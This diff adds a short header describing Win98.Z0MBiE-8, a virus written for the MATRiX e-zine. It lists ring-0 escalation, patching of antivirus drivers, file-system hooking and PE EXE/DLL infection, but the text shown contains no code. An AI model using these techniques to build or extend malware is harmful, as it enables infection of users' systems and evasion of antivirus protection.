@@ -1,0 +1,10 @@
+    Win98.Z0MBiE-8      written for MATRiX #2 E-Zine      http://z0mbie.cjb.net
+
+
+    þ enter ring-0 via INT 2E/PoCallDriver [ring0.inc]
+    þ patch AV VxDs (spider/avp95/avpguard/gk95.vxd) [killavxd.inc]
+    þ ring0-resident in the 2nd half of the GDT
+    þ hook file IO using IFSMGR_FileSystemApiHook:IFSFN_OPEN/RENAME/ATTRIB
+    þ infect PE EXE/DLLs (inserting into 1st section) [infect.inc]
+    þ share-fucking tech. used in file io operations [r0io.inc]
+    þ 1624 bytes
